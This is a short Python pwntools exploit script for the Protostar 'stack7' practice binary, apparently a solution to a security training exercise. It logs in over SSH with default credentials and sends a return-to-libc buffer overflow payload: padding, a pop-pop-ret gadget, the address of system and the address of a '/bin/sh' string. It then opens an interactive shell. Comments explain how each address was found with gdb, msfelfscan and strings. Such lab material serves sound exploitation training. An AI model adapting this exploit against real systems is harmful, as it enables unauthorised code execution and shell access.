#!/usr/bin/env python
from pwn import *

offset = 80
gadget = 0x08048492     # pop pop ret gadget, can be done by:
                        # msfelfscan -p <binary> ,or objdump -d
system = 0xb7ecffb0  # (gdb) p system ## process must be running
libCBase = 0xb7e97000 # (gdb) info proc map ## process must be running
shellOffset = 0x11f3bf # strings -a -t x /lib/libc-2.11.2.so | grep "/bin/sh"
shellAddr = libCBase + shellOffset
if len(sys.argv) < 2:
    print("usage: ./%s <ip>" % sys.argv[0])
else:
    s = ssh("user", sys.argv[1], 22, password="user")
    payload = 'A' * offset
    payload += p32(gadget)
    payload += "B"*8            # addresses to pop
    payload += p32(system)
    payload += p32(0xCafeBabe)  # Address where to return after calling system 
    payload += p32(shellAddr)
    r = s.run('/opt/protostar/bin/stack7')
    print(r.recv(1024))
    r.send(payload+ '\n')
    r.interactive()
    r.close()
